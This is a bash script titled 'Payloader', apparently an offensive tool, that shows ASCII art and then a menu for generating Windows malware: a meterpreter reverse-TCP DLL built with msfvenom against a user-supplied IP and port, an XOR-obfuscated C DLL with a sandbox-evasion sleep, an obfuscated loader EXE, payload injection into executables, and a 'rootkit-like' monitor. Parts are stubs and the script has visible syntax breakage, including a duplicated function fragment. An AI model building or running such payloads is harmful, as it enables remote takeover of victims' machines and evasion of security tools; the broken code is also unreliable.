

#!/bin/bash


# Initializ var to 2 to enter the while loop
var=2

while [ $var -eq 2 ]; do
    
    
    if [[ "$XDG_CURRENT_DESKTOP" == "KDE" || "$DESKTOP_SESSION" == "plasma" ]]; then
    

    # Save the current font size setting
    current_font_size=$(kwriteconfig5 --file kdeglobals --group General --key font)
    echo "Current font size is: $current_font_size"

    # Temp. change the font size
    kwriteconfig5 --file kdeglobals --group General --key font "Noto Sans, 3"

    # Simulate 
    # Function to echo each line with a delay  of 0.0825 seconds
    function delayed_echo {
        echo "$1"
        sleep 0.0825
    }
    
    # ASCII art lines
    delayed_echo "............................................................................................................................................................................................................................................................................................................"
    delayed_echo "............................................................................................................................................................................................................................................................................................................"
    delayed_echo "............................................................................................................................................................................................................................................................................................................"
    delayed_echo ".........................................''''''',,,,,,,,;;;;;,,,,,,,,,,''''''..............................................................................................................................................................................................................................."
    delayed_echo "..........................................'''''''''',,,,,,;;;;;::::ccccclllllllllccc:::;;;,,,''............................................................................................................................................................................................................."
    delayed_echo "........................................................................''',,,;;;::ccllloooooolllcc:;;,,''.................................................................................................................................................................................................."
    delayed_echo ".......................................................................................'',,;;::cllooooooollcc:;;,'.........................................................................................................................................................................................."
    delayed_echo "..................................................................................................'',;;:clloodddoolc::;,'..................................................................................................................................................................................."
    delayed_echo "...........................................................................................................',;::cloodddoolc:;,'............................................................................................................................................................................."
    delayed_echo "..................................................................................................................',;:cloodddool:;,'........................................................................................................................................................................"
    delayed_echo ".........................................................................................................................';:clooddolc'......................................................................................................................................................................"
    delayed_echo ".......................................................................''',,,,;;;;;:::::::::::ccccc:::::::::;;;;;,,,,'''......',:lool,......................................................................................................................................................................"
    delayed_echo "..........................................................'',,;;::cccllooooooooooooooooooooooooooooooooooooooooooooooooolllcc::;',lol,......................................................................................................................................................................"
    delayed_echo "................................................'',,;::ccllooollllcccc::::;;;;,,,,,,''''''''''''''''''''''',,,,,,;;;;:::ccclllol:':oo;......................................................................................................................................................................"
    delayed_echo "........................................'',;;::ccccc:::;;,,,'''...............................................................'''.'coc'....................................................................................................................................................................."
    delayed_echo ".................................'',,,;;;;;,,'''........................................................................''''''''''.;ll,....................................................................................................................................................................."
    delayed_echo "..............................''''''......................................................................'',,;;:::cccllllllllllll;';l:'...................................................................................................................................................................."
    delayed_echo ".................................................................................................'',;;:ccllllooooooolllllcccc:::::;.':l;...................................................................................................................................................................."
    delayed_echo ".........................................................................................'',;::cllloooolllcc::;;;,,'''...............'cl;..................................................................................................................................................................."
    delayed_echo "...................................................................................',;;:clllolllcc::;,,''.............................,cc;'..................................................................................................................................................................."
    delayed_echo ".............................................................................',;;:clllllcc:;,,'........................................;cc:,...............................''''............................................................................................................................."
    delayed_echo "........................................................................',;:cllllc::;,''................................................;clc:;,'...............................''''........................................................................................................................."
    delayed_echo "...................................................................',;:clllc:;,''........................................................;ccccccc::::::::;;;;,,'''................'''......................................................................................................................."
    delayed_echo "...............................................................',;cccc:;,'..............................................................,:ccccccccccccccccccccccc:::;,,''...'........','...................................................................................................................."
    delayed_echo "...........................................................';:cc:;;,'................................................................';:cccccccccc::::::::::ccccccccccc:::;;:;'....'....','................................................................................................................."
    delayed_echo ".......................................................',;::;,'....................................................................,:ccccccc:;,''............''',,;;::::c::::::;'.';,.....','..............................................................................................................."
    delayed_echo "...................................................',;;;,'......................................................................';:ccccc:;'...........................',,;:::::::::::,......',,............................................................................................................."
    delayed_echo "................................................',,,''.........................................................................,:cccc:;'....................................',;;::::::;,,,;'...,,..........................................................................................................."
    delayed_echo "..............................................'''.............................................................................;:ccc:;'...........................................',;;::::::;,....'.........................................................................................................."
    delayed_echo ".............................................................................................................................;:::::,..................................................',;;:::;,'''''........................................................................................................"
    delayed_echo "............................................................................................................................;:::::,.......................................................',;;;;;;;;,......................................................................................................."
    delayed_echo "...........................................................................................................................,:::::,...........................................................;;;;;;;,,'....................................................................................................."
    delayed_echo "...........................................................................................................................;::::,............................................................,;;;;;;,','...................................................................................................."
    delayed_echo "..........................................................................................................................'::::;'.............................................................',;;;;;,,,'..................................................................................................."
    delayed_echo "..........................................................................................................................,::::;..................................................................',,,;;,'.................................................................................................."
    delayed_echo "..........................................................................................................................,;;;;,......................................................................',,,,'................................................................................................"
    delayed_echo "..........................................................................................................................,;;;;,.........................................................................',,,,''............................................................................................"
    delayed_echo "..........................................................................................................................,;;;;;'..........................................................................',,''............................................................................................"
    delayed_echo "..........................................................................................................................,;;;;;'..........................................................................................................................................................................."
    delayed_echo "..........................................................................................................................',;;;;,..........................................................................................................................................................................."
    delayed_echo "...........................................................................................................................';;;;,,.........................................................................................................................................................................."
    delayed_echo "............................................................................................................................,,,,,,,........................................................................................................................................................................."
    delayed_echo ".............................................................................................................................,,,,,,,........................................................................................................................................................................"
    delayed_echo "..............................................................................................................................',,,,,,'......................................................................................................................................................................"
    delayed_echo "................................................................................................................................,,,,,,''...................................................................................................................................................................."
    delayed_echo ".................................................................................................................................',,,,,,''.................................................................................................................................................................."
    delayed_echo "...................................................................................................................................'',,,,,,'''.............................................................................................................................................................."
    delayed_echo "......................................................................................................................................',,,,,,,,,'''........................................................................................................................................................."
    delayed_echo ".........................................................................................................................................',,,,,,,,,,,,,,,,,,,,,,'''''''''''''''............................................................................................................................."
    delayed_echo ".............................................................................................................................................'',,,,,,,;,;;,,;;;;;;;;;;;;;;;;;;;;;;;;,,,,,''''..............................................................................................................."
    delayed_echo ".....................................................................................................................................................''''''''''',,,,,,,,;;;;;;;;;;;;;;;;;;;;;;;;,,''........................................................................................................"
    delayed_echo ".............................................................................................................................................................................''',,,;;;;;;;:;;;,,,,;;;;;,''.................................................................................................."
    delayed_echo "......................................................................................................................................................................................',,;;::;;,''...',;;;;;,'.............................................................................................."
    delayed_echo "...........................................................................................................................................................................................'',;::;;'.....'',;:;;,..........................................................................................."
    delayed_echo "...............................................................................................................................................................................................',;:::;'......',;::;,........................................................................................"
    delayed_echo "...................................................................................................................................................................................................,;::;,........,;::,'....................................................................................."
    delayed_echo ".....................................................................................................................................................................................................';:::,........',::;'..................................................................................."
    delayed_echo ".......................................................................................................................................................................................................';cc;'.........,::;'................................................................................."
    delayed_echo ".........................................................................................................................................................................................................,:c:,..........,::,................................................................................"
    delayed_echo "...........................................................................................................................................................................................................;:c;'..........;:;..............................................................................."
    delayed_echo "............................................................................................................................................................................................................,:c:'..........';;'............................................................................."
    delayed_echo ".............................................................................................................................................................................................................';c:,..........';;............................................................................."
    delayed_echo "...............................................................................................................................................................................................................;c:'...........;,............................................................................"
    delayed_echo "................................................................................................................................................................................................................;c:'...........,'..........................................................................."
    delayed_echo ".................................................................................................................................................................................................................;c;'...........,..........................................................................."
    delayed_echo "..................................................................................................................................................................................................................;:;...........'..........................................................................."
    delayed_echo "...................................................................................................................................................................................................................'::'....................................................................................."
    delayed_echo "....................................................................................................................................................................................................................,:,....................................................................................."
    delayed_echo ".....................................................................................................................................................................................................................;;'...................................................................................."
    delayed_echo ".....................................................................................................................................................................................................................';,...................................................................................."
    delayed_echo "......................................................................................................................................................................................................................,;...................................................................................."
    delayed_echo "......................................................................................................................................................................................................................','..................................................................................."
    delayed_echo ".......................................................................................................................................................................................................................,'..................................................................................."
    delayed_echo ".......................................................................................................................................................................................................................''..................................................................................."
    delayed_echo "........................................................................................................................................................................................................................'..................................................................................."
    delayed_echo "............................................................................................................................................................................................................................................................................................................"
    delayed_echo "............................................................................................................................................................................................................................................................................................................"
    delayed_echo "............................................................................................................................................................................................................................................................................................................"

    # original font size
    echo "Restoring the original font size"
    kwriteconfig5 --file kdeglobals --group General --key font "$current_font_size"

    # changes (this refreshes the desktop settings)
    qdbus org.kde.KWin /KWin reconfigure

    else
    # echo each line with a delay of 0.12 seconds
    function delayed_echo {
        echo "$1"
        sleep 0.12
    }
    
    # ASCII art lines with maximum 80 characters per echo
    delayed_echo "...................''''',,,,,,,,'...............Payloader.........................."
    delayed_echo "...........................'',,;;;;;,................................................"
    delayed_echo ".............'''''',,,,,,,,,,,,,,,,;:,..............................................."
    delayed_echo "...........................'',,,,,,,,,..............................................."
    delayed_echo ".....................''',,,,'''......','............................................."
    delayed_echo "..................''''...............';:;;,,,,,'''..................................."
    delayed_echo "....................................,;'........'',,,,'..............................."
    delayed_echo "...................................;,................',,............................."
    delayed_echo "..................................,,...................''............................"
    delayed_echo "..................................',................................................."
    delayed_echo "...................................,'................................................"
    delayed_echo "....................................''..............................................."
    delayed_echo ".......................................''''''''''''.................................."
    delayed_echo "..................................................''',,''............................"
    delayed_echo "........Vertibrea......................................'''..'............. .........."
    delayed_echo ".........................................................''...'........XFZ1.........."
    delayed_echo "...........................................................'........................."
    delayed_echo "............................................................'........................^"
    fi

    # XOR Encryption
    xor_encrypt() {
        local input=$1
        local key=$2
        local encrypted=""
        
        for ((i = 0; i < ${#input}; i++)); do
            char=${input:$i:1}
            ord=$(printf '%d' "'$char")
            key_char=${key:$((i % ${#key})):1}
            key_ord=$(printf '%d' "'$key_char")
            xor_ord=$((ord ^ key_ord))
            encrypted+=$(printf '\\x%02x' $xor_ord)
        done
        
        echo -n "$encrypted"
    }

    # Function to generate a manually obfuscated DLL payload with a sleep timer
    generate_manual_obfuscated_dll() {
        local dest_folder=$1
        echo "Generating manually obfuscated DLL payload..."

        # Prompt for IP and Port for reverse shell
        echo "Enter the IP address for reverse shell:"
        read ip_address
        echo "Enter the port number:"
        read port_number

        # Encrypt IP and Port strings using XOR encryption
        encryption_key="mysecretkey"
        encrypted_ip=$(xor_encrypt "$ip_address" "$encryption_key")
        encrypted_port=$(xor_encrypt "$port_number" "$encryption_key")

        # Create a dummy obfuscated DLL in C with a sleep timer (simulate reverse shell functionality)
        local dll_path="$dest_folder/payload.c"
        cat > "$dll_path" <<EOL
    #include <windows.h>
    #include <stdio.h>

    const char ip[] = "$encrypted_ip";  // Encrypted IP address
    const char port[] = "$encrypted_port";  // Encrypted port

    // XOR decryption function
    void xor_decrypt(char* data, int data_len, const char* key, int key_len) {
        for (int i = 0; i < data_len; i++) {
            data[i] ^= key[i % key_len];
        }
    }

    // Sleep timer to avoid sandboxing
    void evade_sandbox() {
        Sleep(10000);  // Sleep for 10 seconds to avoid sandbox environments
    }

    void connect_back() {
        evade_sandbox();  // Delayed execution to evade sandbox detection

        char decrypted_ip[16];
        char decrypted_port[6];
        strcpy(decrypted_ip, ip);
        strcpy(decrypted_port, port);

        // Decrypt the IP and port
        xor_decrypt(decrypted_ip, sizeof(decrypted_ip), "$encryption_key", ${#encryption_key});
        xor_decrypt(decrypted_port, sizeof(decrypted_port), "$encryption_key", ${#encryption_key});

        printf("Connecting to %s on port %s\\n", decrypted_ip, decrypted_port);
        // Simulate reverse shell behavior (actual implementation skipped)
    }

    BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
        switch (fdwReason) {
            case DLL_PROCESS_ATTACH:
                connect_back();
                break;
        }
        return TRUE;
    }
    EOL

    # Compile the DLL using mingw-w64 (to make it compatible with Windows)
    echo "Compiling obfuscated DLL with sleep timer..."
    i686-w64-mingw32-gcc -shared -o "$dest_folder/payload.dll" "$dll_path" -lws2_32
    echo "Manually obfuscated DLL created at: $dest_folder/payload.dll"
}


        # Compile the DLL using mingw-w64 (to make it compatible with Windows)
        echo "Compiling obfuscated DLL with sleep timer..."
        i686-w64-mingw32-gcc -shared -o "$dest_folder/payload.dll" "$dll_path" -lws2_32
        echo "Manually obfuscated DLL created at: $dest_folder/payload.dll"
    }

    # Function to generate a DLL payload using msfvenom
    generate_msfvenom_dll() {
        local dest_folder=$1
        echo "Generating DLL payload using msfvenom..."

        # Prompt for IP and Port for the reverse shell
        echo "Enter the IP address for reverse shell:"
        read ip_address
        echo "Enter the port number:"
        read port_number

        # Generate the payload using msfvenom
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip_address LPORT=$port_number -f dll > "$dest_folder/payload.dll"
        echo "DLL created at: $dest_folder/payload.dll"
    }

    # Function to create an obfuscated and encrypted EXE loader for the DLL
    generate_obfuscated_loader() {
        local dest_folder=$1
        echo "Creating obfuscated and encrypted loader EXE for DLL..."

        # Create a simple C loader that loads and executes the DLL, with encryption and obfuscation
        local loader_path="$dest_folder/loader.c"
        cat > "$loader_path" <<EOL
    #include <windows.h>
    #include <stdio.h>

    typedef void (*PayloadFunc)();

    const char dll_name[] = "payload.dll";  // Encrypted DLL name

    void xor_decrypt(char* data, int data_len, const char* key, int key_len) {
        for (int i = 0; i < data_len; i++) {
            data[i] ^= key[i % key_len];
        }
    }

    void evade_sandbox() {
        Sleep(10000);  // Sleep for 10 seconds to avoid sandbox detection
    }

    int main() {
        char decrypted_dll[50];
        strcpy(decrypted_dll, dll_name);
        
        // Decrypt the DLL name
        xor_decrypt(decrypted_dll, sizeof(decrypted_dll), "mysecretkey", ${#encryption_key});

        HINSTANCE hDLL = LoadLibrary(decrypted_dll);
        if (hDLL != NULL) {
            PayloadFunc payload = (PayloadFunc)GetProcAddress(hDLL, "DllMain");
            if (payload != NULL) {
                evade_sandbox();  // Add a sleep timer for sandbox evasion
                payload(NULL, DLL_PROCESS_ATTACH, NULL);
            }
        } else {
            printf("Failed to load %s\n", decrypted_dll);
        }
        return 0;
    }
    EOL

        # Compile the loader using mingw-w64 for Windows
        echo "Compiling the obfuscated loader..."
        i686-w64-mingw32-gcc "$loader_path" -o "$dest_folder/loader.exe"
        echo "Loader EXE created at: $dest_folder/loader.exe"
    }

    # Function to inject DLL into a custom executable and obfuscate it
    inject_and_obfuscate_exe() {
        local exe_path=$1
        local dll_path=$2

        echo "Injecting and obfuscating DLL into $exe_path..."
        if [ ! -f "$exe_path" ] || [ ! -f "$dll_path" ]; then
            echo "Executable or DLL not found!"
            return 1
        fi

        # Simple injection: append DLL bytes to the end of the EXE
        cat "$dll_path" >> "$exe_path"
        echo "Payload injected successfully."

        # Use XOR encryption to obfuscate sections of the EXE
        local encrypted_exe="$exe_path.obfuscated"
        xor_encrypt "$(cat "$exe_path")" "mysecretkey" > "$encrypted_exe"
        mv "$encrypted_exe" "$exe_path"

        echo "Executable obfuscated and payload injected: $exe_path"
    }

    # Function to create a rootkit-like monitor with dynamic DLL changes
    create_rootkit_monitor() {
        local dll_path=$1
        echo "Creating rootkit monitor for dynamic DLL modification..."

        # Create a script or C program to monitor DLL changes
        local monitor_path="$dll_path-monitor.c"
        cat > "$monitor_path" <<EOL
    #include <windows.h>
    #include <stdio.h>

    // Rootkit-like function to monitor DLL and modify it remotely
    void monitor_dll_changes() {
        // Simulated monitoring loop
        while (1) {
            Sleep(5000);  // Monitor every 5 seconds

            // Simulate checking and modifying DLL remotely
            printf("Monitoring DLL for changes...\n");
            // Implement functionality to dynamically update DLL (e.g., hot-patching)
        }
    }

    int main() {
        printf("Starting rootkit monitor...\n");
        monitor_dll_changes();
        return 0;
    }
    EOL

        # Compile the rootkit monitor
        echo "Compiling the rootkit monitor..."
        i686-w64-mingw32-gcc "$monitor_path" -o "$dll_path-monitor.exe"
        echo "Rootkit monitor created at: $dll_path-monitor.exe"
    }

    # Menu for user options
    while true; do
        echo "Options"
        echo "1. Create obfuscated DLL payload using msfvenom"
        echo "2. Create manually obfuscated DLL payload"
        echo "3. Create obfuscated and encrypted loader EXE"
        echo "4. Inject and obfuscate DLL into a custom executable"
        echo "5. Create a rootkit-like monitor for DLL"
        echo "6. Exit"
        read -p "Select an option: " option

        case $option in
            1)
                echo "Define destination folder for payload (DLL):"
                read dest_folder
                generate_msfvenom_dll "$dest_folder"
                ;;
            2)
                echo "Define destination folder for payload (DLL):"
                read dest_folder
                generate_manual_obfuscated_dll "$dest_folder"
                ;;
            3)
                echo "Define destination folder for loader EXE:"
                read dest_folder
                generate_obfuscated_loader "$dest_folder"
                ;;
            4)
                echo "Enter path to the custom executable:"
                read exe_path
                echo "Enter path to the DLL to inject:"
                read dll_path
                inject_and_obfuscate_exe "$exe_path" "$dll_path"
                ;;
            5)
                echo "Enter path to the DLL for monitoring:"
                read dll_path
                create_rootkit_monitor "$dll_path"
                ;;
            6)<
                echo "Exiting..."
                exit 0
                ;;
            *)
                echo "Invalid option!"
                ;;
        esac
    done
done


# Script cleanup or restart mechanism
echo "1. Reset script"
echo "2. Kill script "
read state

if [ $state -eq 2 ]; then
    echo "Killing script..."
    exit 0
fi
if [ $state -eq 1 ]; then
    var=2
fi
echo "Restarting script..."

echo "restart = 1"
echo "kill script = 0"
    read state
    
    
if [ $state -eq 0 ]; then
echo "Killing script..."
exit 0
fi
if [ $state -eq 0 ]; then
var = 1
fi
echo "Killing script..."
exit 0
